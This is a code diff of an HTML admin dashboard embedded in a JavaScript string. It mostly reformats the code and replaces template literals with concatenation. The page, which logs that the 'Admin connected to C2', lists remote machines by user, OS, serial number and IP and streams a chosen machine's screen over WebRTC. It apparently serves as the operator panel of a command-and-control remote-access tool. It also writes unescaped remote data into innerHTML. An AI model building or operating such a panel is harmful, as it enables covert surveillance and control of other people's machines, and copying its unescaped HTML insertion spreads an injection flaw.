-                <video id="remoteVideo" autoplay playsinline style="width: 100%; height: 100%; object-fit: contain;"></video>
-            </div>
+ <!-- Actual Remote Desktop Video -->
+ <video id="remoteVideo" autoplay playsinline style="width: 100%; height: 100%; object-fit: contain;"></video>
+ </div>
 
-        </div>
-    </div>
+ </div>
+ </div>
 
-    <!-- Interactive JavaScript -->
-    <script>
-        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-        const host = window.location.host;
-        const wsUrl = \`\${protocol}//\${host}/\`;
+ <!-- Interactive JavaScript -->
+ <script>
+ const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+ const host = window.location.host;
+ const wsUrl = protocol + '//' + host + '/';
 
-        const ws = new WebSocket(wsUrl);
-        let users = {};
-        let sessions = {};
-        const remoteVideo = document.getElementById('remoteVideo');
+ const ws = new WebSocket(wsUrl);
+ let users = {};
+ let sessions = {};
+ const remoteVideo = document.getElementById('remoteVideo');
 
-        ws.onopen = () => {
-            console.log("Admin connected to C2");
-            ws.send(JSON.stringify({ type: 'register_admin' }));
-        };
+ ws.onopen = () => {
+ console.log("Admin connected to C2");
+ ws.send(JSON.stringify({ type: 'register_admin' }));
+ };
 
-        ws.onmessage = (event) => {
-            try {
-                const data = JSON.parse(event.data);
+ ws.onmessage = (event) => {
+ try {
+ const data = JSON.parse(event.data);
 
-                if (data.type === 'registered') {
-                    ws.isAdmin = true;
-                }
-                else if (data.type === 'init_users') {
-                    users = {};
-                    data.users.forEach(user => {
-                        users[user.id] = {
-                            status: user.status === 'Online' ? 'Online' : 'Offline',
-                            info: { os: user.os, user: user.user },
-                            lastSeen: user.last_seen * 1000,
-                            sessionActive: false,
-                            serialNumber: user.serial_number,
-                            ip: user.ip
-                        };
-                    });
-                    renderUsers();
-                }
-                else if (data.type === 'user_update') {
-                    if (!users[data.id]) {
-                        users[data.id] = {
-                            status: 'Online',
-                            info: data.info,
-                            lastSeen: data.lastSeen,
-                            sessionActive: false,
-                            serialNumber: data.info.serialNumber || 'N/A',
-                            ip: data.info.ip || 'Unknown'
-                        };
-                    } else {
-                        users[data.id].status = 'Online';
-                        users[data.id].info = data.info;
-                        users[data.id].lastSeen = data.lastSeen;
-                        users[data.id].sessionActive = false;
-                    }
-                    renderUsers();
-                }
-                else if (data.type === 'heartbeat') {
-                    if (users[data.id]) {
-                        users[data.id].lastSeen = Date.now();
-                        users[data.id].status = 'Online';
-                        renderUsers();
-                    }
-                }
-                else if (data.type === 'offer') {
-                    handleWebRTCOffer(data.sdp, data.targetId);
-                }
-                else if (data.type === 'candidate') {
-                    handleWebRTCCandidate(data.candidate, data.targetId);
-                }
-                else if (data.type === 'session_active') {
-                    if (users[data.agentId]) {
-                        users[data.agentId].sessionActive = true;
-                        users[data.agentId].status = 'Online';
-                        renderUsers();
-                    }
-                }
-                else if (data.type === 'refresh_users') {
-                    // Refresh logic handled by real-time updates
-                }
-            } catch (e) {
-                console.error("Error parsing message:", e);
-            }
-        };
+ if (data.type === 'registered') {
+ ws.isAdmin = true;
+ }
+ else if (data.type === 'init_users') {
+ users = {};
+ data.users.forEach(user => {
+ users[user.id] = {
+ status: user.status === 'Online' ? 'Online' : 'Offline',
+ info: { os: user.os, user: user.user },
+ lastSeen: user.last_seen * 1000,
+ sessionActive: false,
+ serialNumber: user.serial_number,
+ ip: user.ip
+ };
+ });
+ renderUsers();
+ }
+ else if (data.type === 'user_update') {
+ if (!users[data.id]) {
+ users[data.id] = {
+ status: 'Online',
+ info: data.info,
+ lastSeen: data.lastSeen,
+ sessionActive: false,
+ serialNumber: data.info.serialNumber || 'N/A',
+ ip: data.info.ip || 'Unknown'
+ };
+ } else {
+ users[data.id].status = 'Online';
+ users[data.id].info = data.info;
+ users[data.id].lastSeen = data.lastSeen;
+ users[data.id].sessionActive = false;
+ }
+ renderUsers();
+ }
+ else if (data.type === 'heartbeat') {
+ if (users[data.id]) {
+ users[data.id].lastSeen = Date.now();
+ users[data.id].status = 'Online';
+ renderUsers();
+ }
+ }
+ else if (data.type === 'offer') {
+ handleWebRTCOffer(data.sdp, data.targetId);
+ }
+ else if (data.type === 'candidate') {
+ handleWebRTCCandidate(data.candidate, data.targetId);
+ }
+ else if (data.type === 'session_active') {
+ if (users[data.agentId]) {
+ users[data.agentId].sessionActive = true;
+ users[data.agentId].status = 'Online';
+ renderUsers();
+ }
+ }
+ else if (data.type === 'refresh_users') {
+ // Refresh logic handled by real-time updates
+ }
+ } catch (e) {
+ console.error("Error parsing message:", e);
+ }
+ };
 
-        function getSession(targetId) {
-            if (!sessions[targetId]) {
-                sessions[targetId] = {
-                    pc: new RTCPeerConnection({
-                        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
-                    }),
-                    candidates: []
-                };
+ function getSession(targetId) {
+ if (!sessions[targetId]) {
+ sessions[targetId] = {
+ pc: new RTCPeerConnection({
+ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+ }),
+ candidates: []
+ };
 
-                const pc = sessions[targetId].pc;
+ const pc = sessions[targetId].pc;
 
-                pc.ontrack = (event) => {
-                    remoteVideo.srcObject = event.streams[0];
-                    document.getElementById('connectingState').style.display = 'none';
-                };
+ pc.ontrack = (event) => {
+ remoteVideo.srcObject = event.streams[0];
+ document.getElementById('connectingState').style.display = 'none';
+ };
 
-                pc.onicecandidate = (event) => {
-                    if (event.candidate) {
-                        ws.send(JSON.stringify({
-                            type: 'candidate',
-                            targetId: targetId,
-                            candidate: event.candidate
-                        }));
-                    }
-                };
+ pc.onicecandidate = (event) => {
+ if (event.candidate) {
+ ws.send(JSON.stringify({
+ type: 'candidate',
+ targetId: targetId,
+ candidate: event.candidate
+ }));
+ }
+ };
 
-                pc.oniceconnectionstatechange = () => {
-                    const state = pc.iceConnectionState;
-                    if (state === 'disconnected' || state === 'failed') {
-                        closeSession(null, true);
-                    }
-                };
-            }
-            return sessions[targetId];
-        }
+ pc.oniceconnectionstatechange = () => {
+ const state = pc.iceConnectionState;
+ if (state === 'disconnected' || state === 'failed') {
+ closeSession(null, true);
+ }
+ };
+ }
+ return sessions[targetId];
+ }
 
-        async function handleWebRTCOffer(offerSDP, targetId) {
-            const session = getSession(targetId);
-            const pc = session.pc;
+ async function handleWebRTCOffer(offerSDP, targetId) {
+ const session = getSession(targetId);
+ const pc = session.pc;
 
-            try {
-                await pc.setRemoteDescription(new RTCSessionDescription(offerSDP));
+ try {
+ await pc.setRemoteDescription(new RTCSessionDescription(offerSDP));
 
-                while (session.candidates.length > 0) {
-                    const candidate = session.candidates.shift();
-                    await pc.addIceCandidate(new RTCIceCandidate(candidate));
-                }
+ while (session.candidates.length > 0) {
+ const candidate = session.candidates.shift();
+ await pc.addIceCandidate(new RTCIceCandidate(candidate));
+ }
 
-                const answer = await pc.createAnswer();
-                await pc.setLocalDescription(answer);
+ const answer = await pc.createAnswer();
+ await pc.setLocalDescription(answer);
 
-                ws.send(JSON.stringify({
-                    type: 'answer',
-                    targetId: targetId,
-                    sdp: pc.localDescription
-                }));
-            } catch (err) {
-                console.error("[WEBRTC] Error handling offer:", err);
-            }
-        }
+ ws.send(JSON.stringify({
+ type: 'answer',
+ targetId: targetId,
+ sdp: pc.localDescription
+ }));
+ } catch (err) {
+ console.error("[WEBRTC] Error handling offer:", err);
+ }
+ }
 
-        function handleWebRTCCandidate(candidate, targetId) {
-            const session = getSession(targetId);
+ function handleWebRTCCandidate(candidate, targetId) {
+ const session = getSession(targetId);
 
-            if (session.pc.remoteDescription) {
-                session.pc.addIceCandidate(new RTCIceCandidate(candidate))
-                    .catch(err => console.error("[WEBRTC] Error adding candidate:", err));
-            } else {
-                session.candidates.push(candidate);
-            }
-        }
+ if (session.pc.remoteDescription) {
+ session.pc.addIceCandidate(new RTCIceCandidate(candidate))
+ .catch(err => console.error("[WEBRTC] Error adding candidate:", err));
+ } else {
+ session.candidates.push(candidate);
+ }
+ }
 
-        function closeSession(e, force = false) {
-            if(e) e.preventDefault();
-            document.getElementById('sessionModal').classList.remove('active');
-            
-            Object.keys(sessions).forEach(sid => {
-                if(sessions[sid].pc) sessions[sid].pc.close();
-                delete sessions[sid];
-            });
-            remoteVideo.srcObject = null;
-            document.getElementById('connectingState').style.display = 'block';
-        }
+ function closeSession(e, force = false) {
+ if(e) e.preventDefault();
+ document.getElementById('sessionModal').classList.remove('active');
+ 
+ Object.keys(sessions).forEach(sid => {
+ if(sessions[sid].pc) sessions[sid].pc.close();
+ delete sessions[sid];
+ });
+ remoteVideo.srcObject = null;
+ document.getElementById('connectingState').style.display = 'block';
+ }
 
-        function renderUsers() {
-            const grid = document.getElementById('table-body');
-            grid.innerHTML = '';
-            
-            let total = Object.keys(users).length;
-            let online = 0;
-            let offline = 0;
-            let activeSessions = 0;
+ function renderUsers() {
+ const grid = document.getElementById('table-body');
+ grid.innerHTML = '';
+ 
+ let total = Object.keys(users).length;
+ let online = 0;
+ let offline = 0;
+ let activeSessions = 0;
 
-            for (const [id, data] of Object.entries(users)) {
-                if (data.status === 'Online') online++;
-                else offline++;
-                
-                if (data.sessionActive) activeSessions++;
+ for (const [id, data] of Object.entries(users)) {
+ if (data.status === 'Online') online++;
+ else offline++;
+ 
+ if (data.sessionActive) activeSessions++;
 
-                const card = document.createElement('div');
-                card.className = 'table-row';
-                card.onclick = () => openSession(id, data);
+ const card = document.createElement('div');
+ card.className = 'table-row';
+ card.onclick = () => openSession(id, data);
 
-                const osInfo = data.info ? \`\${data.info.os || 'Unknown'} / \${data.info.user || 'Unknown'}\` : 'Unknown OS';
-                const lastSeen = data.lastSeen ? new Date(data.lastSeen).toLocaleTimeString() : 'N/A';
+ const osInfo = (data.info ? (data.info.os || 'Unknown') + ' / ' + (data.info.user || 'Unknown') : 'Unknown OS');
+ const lastSeen = data.lastSeen ? new Date(data.lastSeen).toLocaleTimeString() : 'N/A';
 
-                let statusColor = 'status-offline';
-                let btnText = 'Join Session';
-                let btnClass = '';
+ let statusColor = 'status-offline';
+ let btnText = 'Join Session';
+ let btnClass = '';
 
-                if (data.status === 'Online') {
-                    statusColor = 'status-online';
-                    if (data.sessionActive) {
-                        btnText = 'Reconnect Session';
-                        btnClass = 'active';
-                    }
-                } else if (data.status === 'Connecting...') {
-                    statusColor = 'status-connecting';
-                    btnText = 'Connecting...';
-                }
+ if (data.status === 'Online') {
+ statusColor = 'status-online';
+ if (data.sessionActive) {
+ btnText = 'Reconnect Session';
+ btnClass = 'active';
+ }
+ } else if (data.status === 'Connecting...') {
+ statusColor = 'status-connecting';
+ btnText = 'Connecting...';
+ }
 
-                card.innerHTML = \`
-                    <div class="custom-checkbox" onclick="event.stopPropagation(); this.classList.toggle('checked');"></div>
-                    <div class="machine-info">
-                        <span class="name"><i class="fa-solid fa-laptop"></i> \${id}</span>
-                        <span class="company">\${data.serialNumber || 'N/A'}</span>
-                    </div>
-                    <div style="color: var(--text-muted); font-size: 0.9rem;">\${osInfo}</div>
-                    <div class="status">
-                        <div class="status-dot \${statusColor}"></div> \${data.status}
-                    </div>
-                `;
-                grid.appendChild(card);
-            }
+ card.innerHTML = 
+ '<div class="custom-checkbox" onclick="event.stopPropagation(); this.classList.toggle(\'checked\');"></div>' +
+ '<div class="machine-info">' +
+ '<span class="name"><i class="fa-solid fa-laptop"></i> ' + id + '</span>' +
+ '<span class="company">' + (data.serialNumber || 'N/A') + '</span>' +
+ '</div>' +
+ '<div style="color: var(--text-muted); font-size: 0.9rem;">' + osInfo + '</div>' +
+ '<div class="status">' +
+ '<div class="status-dot ' + statusColor + '"></div> ' + data.status +
+ '</div>';
+ grid.appendChild(card);
+ }
 
-            document.getElementById('totalUsers').innerText = total;
-            document.getElementById('onlineUsers').innerText = online;
-            document.getElementById('offlineUsers').innerText = offline;
-            document.getElementById('activeSessions').innerText = activeSessions;
-        }
+ document.getElementById('totalUsers').innerText = total;
+ document.getElementById('onlineUsers').innerText = online;
+ document.getElementById('offlineUsers').innerText = offline;
+ document.getElementById('activeSessions').innerText = activeSessions;
+ }
 
-        function openSession(machineId, data) {
-            document.getElementById('modalMachineName').innerText = \`\${machineId} - \${data.serialNumber}\`;
-            document.getElementById('connectingState').style.display = 'block';
-            document.getElementById('sessionModal').classList.add('active');
-            
-            ws.send(JSON.stringify({
-                type: 'request_join',
-                targetId: machineId,
-                from: null
-            }));
-        }
+ function openSession(machineId, data) {
+ document.getElementById('modalMachineName').innerText = machineId + ' - ' + data.serialNumber;
+ document.getElementById('connectingState').style.display = 'block';
+ document.getElementById('sessionModal').classList.add('active');
+ 
+ ws.send(JSON.stringify({
+ type: 'request_join',
+ targetId: machineId,
+ from: null
+ }));
+ }
 
-        function openNewSession() {
-            alert("New Session functionality would go here.");
-        }
+ function openNewSession() {
+ alert("New Session functionality would go here.");
+ }
 
-        function filterTable() {
-            const input = document.getElementById('searchInput');
-            const filter = input.value.toLowerCase();
-            const rows = document.querySelectorAll('.table-row');
+ function filterTable() {
+ const input = document.getElementById('searchInput');
+ const filter = input.value.toLowerCase();
+ const rows = document.querySelectorAll('.table-row');
 
-            rows.forEach(row => {
-                const text = row.innerText.toLowerCase();
-                row.style.display = text.includes(filter) ? '' : 'none';
-            });
-        }
-    </script>
+ rows.forEach(row => {
+ const text = row.innerText.toLowerCase();
+ row.style.display = text.includes(filter) ? '' : 'none';
+ });
+ }
+ </script>
 </body>
 </html>
 `;
